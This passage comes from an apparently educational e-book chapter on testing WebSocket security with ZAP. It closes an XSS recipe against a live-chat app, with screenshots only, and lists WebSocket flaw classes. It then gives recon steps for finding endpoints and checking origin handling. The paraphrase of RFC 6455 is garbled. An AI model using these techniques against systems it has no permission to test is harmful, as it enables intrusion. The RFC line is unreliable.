<p class="callout"><span class="koboSpan" id="kobo.886.1">If the </span><strong class="bold"><span class="koboSpan" id="kobo.887.1">Live Chat</span></strong><span class="koboSpan" id="kobo.888.1"> feature of the web application stops working or the chat says </span><strong class="bold"><span class="koboSpan" id="kobo.889.1">Disconnected</span></strong><span class="koboSpan" id="kobo.890.1">, open a new </span><strong class="bold"><span class="koboSpan" id="kobo.891.1">Live Chat</span></strong><span class="koboSpan" id="kobo.892.1"> to continue </span><span class="No-Break"><span class="koboSpan" id="kobo.893.1">the recipe.</span></span></p>
<ol>
<li value="8"><span class="koboSpan" id="kobo.894.1">The browser will trigger an alert, which will also happen on the support agent’s </span><span class="No-Break"><span class="koboSpan" id="kobo.895.1">client side:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer245">
<span class="koboSpan" id="kobo.896.1"><img alt="Figure 9.24 – A JavaScript alert" src="image/Figure_9.24_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.897.1">Figure 9.24 – A JavaScript alert</span></p>
<p><span class="koboSpan" id="kobo.898.1">In the first screenshot, you see the alert box pop up on the client side. </span><span class="koboSpan" id="kobo.898.2">Over in the chat message in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.899.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.900.1">.25</span></em><span class="koboSpan" id="kobo.901.1">, you see a blank HTML icon for the image tag. </span><span class="koboSpan" id="kobo.901.2">This is our </span><span class="No-Break"><span class="koboSpan" id="kobo.902.1">malicious payload:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer246">
<span class="koboSpan" id="kobo.903.1"><img alt="Figure 9.25 – A successful attack shown in a chat" src="image/Figure_9.25_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.904.1">Figure 9.25 – A successful attack shown in a chat</span></p>
<h2 id="_idParaDest-281"><a id="_idTextAnchor359"/><span class="koboSpan" id="kobo.905.1">How it works...</span></h2>
<p><span class="koboSpan" id="kobo.906.1">According to RFC 6455, the WebSocket Protocol enables two-way communication between a </span><a id="_idIndexMarker458"/><span class="koboSpan" id="kobo.907.1">client running erroneous code in an organized element and a remote host that has granted permission for communications from that code. </span><span class="koboSpan" id="kobo.907.2">This uses the origin-based security concept, widely utilized by online browsers. </span><span class="koboSpan" id="kobo.907.3">The protocol </span><a id="_idIndexMarker459"/><span class="koboSpan" id="kobo.908.1">starts with a handshake and then layers the </span><strong class="bold"><span class="koboSpan" id="kobo.909.1">Transmission Control Protocol</span></strong><span class="koboSpan" id="kobo.910.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.911.1">TCP</span></strong><span class="koboSpan" id="kobo.912.1">) with some simple message framing. </span><span class="koboSpan" id="kobo.912.2">This technology’s objective is to give browser-based applications that require two-way communication with servers a method of doing so without having to initiate several HTTP connections (that is, by utilizing </span><strong class="source-inline"><span class="koboSpan" id="kobo.913.1">XMLHttpRequest</span></strong><span class="koboSpan" id="kobo.914.1"> or </span><strong class="source-inline"><span class="koboSpan" id="kobo.915.1">&lt;iframe&gt;s</span></strong><span class="koboSpan" id="kobo.916.1"> and </span><span class="No-Break"><span class="koboSpan" id="kobo.917.1">lengthy polling).</span></span></p>
<p class="callout-heading"><span class="koboSpan" id="kobo.918.1">Important note</span></p>
<p class="callout"><span class="koboSpan" id="kobo.919.1">Some assaults may result in the loss of your connection, in which case you must create a </span><span class="No-Break"><span class="koboSpan" id="kobo.920.1">new one.</span></span></p>
<p><span class="koboSpan" id="kobo.921.1">Practically any </span><a id="_idIndexMarker460"/><span class="koboSpan" id="kobo.922.1">web security flaw may occur in regard </span><span class="No-Break"><span class="koboSpan" id="kobo.923.1">to WebSockets:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.924.1">Improper handling of user input when transferred to the server creates flaws such as </span><a id="_idIndexMarker461"/><span class="koboSpan" id="kobo.925.1">SQL injection or </span><strong class="bold"><span class="koboSpan" id="kobo.926.1">XML external entity</span></strong><span class="koboSpan" id="kobo.927.1"> (</span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.928.1">XXE</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.929.1">) injection</span></span></li>
<li><span class="koboSpan" id="kobo.930.1">Blind WebSocket vulnerabilities may need to be exploited through out-of-band (</span><span class="No-Break"><span class="koboSpan" id="kobo.931.1">OAST) methods</span></span></li>
<li><span class="koboSpan" id="kobo.932.1">XSS or other client-side vulnerabilities may result if attacker-controlled data is sent over WebSockets to other </span><span class="No-Break"><span class="koboSpan" id="kobo.933.1">application users</span></span></li>
</ul>
<h2 id="_idParaDest-282"><a id="_idTextAnchor360"/><span class="koboSpan" id="kobo.934.1">There's more...</span></h2>
<p><span class="koboSpan" id="kobo.935.1">When initializing your methodology before attacking a WebSocket, look at the JavaScript files or the page’s source code to discover the WebSocket endpoints. </span><span class="koboSpan" id="kobo.935.2">Look for the following in the </span><span class="No-Break"><span class="koboSpan" id="kobo.936.1">JavaScript code:</span></span></p>
<ul>
<li><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.937.1">wss://</span></strong></span></li>
<li><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.938.1">ws://</span></strong></span></li>
<li><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.939.1">websocket</span></strong></span></li>
</ul>
<p><span class="koboSpan" id="kobo.940.1">A WebSocket </span><a id="_idIndexMarker462"/><span class="koboSpan" id="kobo.941.1">URL will be formatted as </span><strong class="source-inline"><span class="koboSpan" id="kobo.942.1">wss://example.com</span></strong><span class="koboSpan" id="kobo.943.1"> (</span><strong class="source-inline"><span class="koboSpan" id="kobo.944.1">wss://</span></strong><span class="koboSpan" id="kobo.945.1"> for a </span><strong class="bold"><span class="koboSpan" id="kobo.946.1">secure socket layer</span></strong><span class="koboSpan" id="kobo.947.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.948.1">SSL</span></strong><span class="koboSpan" id="kobo.949.1">) connection). </span><span class="koboSpan" id="kobo.949.2">Similar to </span><strong class="source-inline"><span class="koboSpan" id="kobo.950.1">https://</span></strong><span class="koboSpan" id="kobo.951.1">, and </span><strong class="source-inline"><span class="koboSpan" id="kobo.952.1">ws://</span></strong><span class="koboSpan" id="kobo.953.1">, which is </span><span class="No-Break"><span class="koboSpan" id="kobo.954.1">like </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.955.1">http://</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.956.1">.</span></span></p>
<p><span class="koboSpan" id="kobo.957.1">Next, to determine whether the WebSocket endpoint is accepting connections from other origins within ZAP, examine the connections. </span><span class="koboSpan" id="kobo.957.2">Send a request from the </span><strong class="bold"><span class="koboSpan" id="kobo.958.1">Manual Request Editor</span></strong><span class="koboSpan" id="kobo.959.1"> with your origin specified in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.960.1">origin</span></strong><span class="koboSpan" id="kobo.961.1"> header value. </span><span class="koboSpan" id="kobo.961.2">If the connection is successful, the server will reply with a status code </span><strong class="source-inline"><span class="koboSpan" id="kobo.962.1">101</span></strong><span class="koboSpan" id="kobo.963.1">, and your requested origin will be mirrored </span><em class="italic"><span class="koboSpan" id="kobo.964.1">or</span></em><span class="koboSpan" id="kobo.965.1"> notated with a wildcard (</span><strong class="source-inline"><span class="koboSpan" id="kobo.966.1">*</span></strong><span class="koboSpan" id="kobo.967.1">) in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.968.1">origin</span></strong><span class="koboSpan" id="kobo.969.1"> header of </span><span class="No-Break"><span class="koboSpan" id="kobo.970.1">the response.</span></span></p>
<h2 id="_idParaDest-283"><a id="_idTextAnchor361"/><span class="koboSpan" id="kobo.971.1">See also</span></h2>
<p><em class="italic"><span class="koboSpan" id="kobo.972.1">RFC6455: The WebSocket </span></em><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.973.1">Protocol</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.974.1">: </span></span><a href="https://www.rfc-editor.org/rfc/rfc6455"><span class="No-Break"><span class="koboSpan" id="kobo.975.1">https://www.rfc-editor.org/rfc/rfc6455</span></span></a></p>
</div>
</body></html>